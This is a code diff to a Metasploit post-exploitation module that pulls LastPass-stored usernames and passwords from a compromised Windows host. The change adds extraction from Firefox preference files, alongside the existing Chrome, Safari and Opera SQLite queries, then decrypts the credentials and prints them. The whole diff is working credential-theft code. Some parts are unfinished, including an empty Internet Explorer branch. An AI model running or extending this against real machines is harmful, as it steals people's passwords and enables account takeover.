@@ -1,6 +1,7 @@
 require 'msf/core'
 require 'base64'
 require 'sqlite3'
+require 'uri'
 
 class Metasploit3 < Msf::Post
   include Msf::Post::File
@@ -28,7 +29,6 @@ class Metasploit3 < Msf::Post
     print_status "Searching for LastPass databases..."
 
     db_paths = database_paths # Find databases and get the remote paths
-
     if db_paths.size == 0 # Found any database?
       print_status "No databases found"
       return
@@ -36,27 +36,47 @@ class Metasploit3 < Msf::Post
 
     print_status "Looking for credentials in all databases found..."
 
+    credentials = []
     db_paths.each do |db_path|
-      # Read and store the remote database locally
-      data = read_file(db_path)
-      loot_path = store_loot('lastpass.database', 'application/x-sqlite3', data, nil, "LastPass database #{db_path}")
+      if db_path =~ /Mozilla/ # Firefox
+        password_line = nil
+        # Read and store the remote preferences file locally
+        data = read_file(db_path)
+        loot_path = store_loot('firefox.preferences', 'text/javascript', session, data, nil, "Firefox preferences file #{db_path}")
 
-      # Parsing/Querying the DB
-      db = SQLite3::Database.new(loot_path)
-      query_result = db.execute("SELECT username, password FROM LastPassSavedLogins2 WHERE username IS NOT NULL AND username != '' AND password IS NOT NULL AND password != '';")
+        # Parse preference file
+        user_line = password_line = nil
+        File.readlines(loot_path).each do |line|
+          user_line = line if (line['extensions.lastpass.loginusers'])
+          password_line = line if (line['extensions.lastpass.loginpws'])
+        end
+        
+        # Extract usernames and passwords
+        user_line.match(/user_pref\("extensions.lastpass.loginusers", "(.*)"\);/) ? encoded_username = user_line.match(/user_pref\("extensions.lastpass.loginusers", "(.*)"\);/)[1] : encoded_username = nil
+        password_line.match(/user_pref\("extensions.lastpass.loginpws", "(.*)"\);/) ? encoded_password = password_line.match(/user_pref\("extensions.lastpass.loginpws", "(.*)"\);/)[1] : encoded_password = nil
+        credentials.push([URI.unescape(encoded_username), Base64.decode64(encoded_password)]) unless encoded_username.nil? || encoded_password.nil?
 
-      query_result.each do |row| # Decrypt passwords
+      elsif db_path =~ /Explorer/ # Internet Explorer
+        
+      else # Chrome, Safari and Opera
+        # Read and store the remote database locally
+        data = read_file(db_path)
+        loot_path = store_loot('lastpass.database', 'application/x-sqlite3', session, data, nil, "LastPass database #{db_path}")
+
+        # Parsing/Querying the DB
+        db = SQLite3::Database.new(loot_path)
+        credentials = db.execute("SELECT username, password FROM LastPassSavedLogins2 WHERE username IS NOT NULL AND username != '' AND password IS NOT NULL AND password != '';")
+      end
+
+      # Parse and decrypt credentials
+      credentials.each do |row| # Decrypt passwords
         print_status "Decrypting password for user #{row[0]}..."
         password = clear_text_password(row[0], row[1])
-          if password.blank?
-            print_error "Username: '#{row[0]}' (Password was not found/decrypted)"
-          else
-            print_good("Username: '#{row[0]}' -> Password: '#{password}'")
-          end
+        print_good("Username: '#{row[0]}' -> Password: '#{password}'") unless password.blank?
+        print_line ""
       end
     end
   end
-
 
 
   # Finds the databases in the victim's machine
@@ -95,6 +115,17 @@ class Metasploit3 < Msf::Post
       elsif os =~ /XP/
         user_profiles.each do |user_profile|
           print_status "Found user: #{user_profile['UserName']}"
+
+          # Check Firefox
+          print_status 'Checking in Firefox...'
+          profiles = profile_paths("#{user_profile['AppData']}\\Mozilla\\Firefox\\Profiles", "Firefox")
+          if profiles
+            print_good "Found #{profiles.size} profile files in Firefox"
+            profiles.each do |profile_path|
+              file_paths = ["#{profile_path}\\prefs.js"]
+              found_dbs_paths.push(file_paths) unless file_paths.nil?
+            end
+          end
 
           # Check Chrome
           print_status 'Checking in Chrome...'
@@ -223,6 +254,40 @@ class Metasploit3 < Msf::Post
       return nil
     end
   end
+
+
+
+  # Returns the profile path for Firefox
+  def profile_paths(path, browser)
+    found_dbs_paths = []
+
+    if directory?(path)
+      if session.type == "meterpreter"
+        files = client.fs.dir.entries(path)
+        files.each do |file_path|
+          found_dbs_paths.push(File.join(path, file_path).gsub("/","\\")) if file_path != '.' &&  file_path != '..'
+        end
+
+      elsif session.type == "shell"
+        files = session.shell_command("ls \"#{path}\"").split
+        files.each do |file_path|
+          found_dbs_paths.push(File.join(path, file_path).gsub("/","\\"))
+        end
+
+      else
+        print_error "Session type not recognized: #{session.type}"
+        return nil
+      end
+    end
+
+    if found_dbs_paths.size > 0
+      return found_dbs_paths
+    else
+      print_status "No profile paths found for #{browser}"
+      return nil
+    end
+  end
+
 
 
 
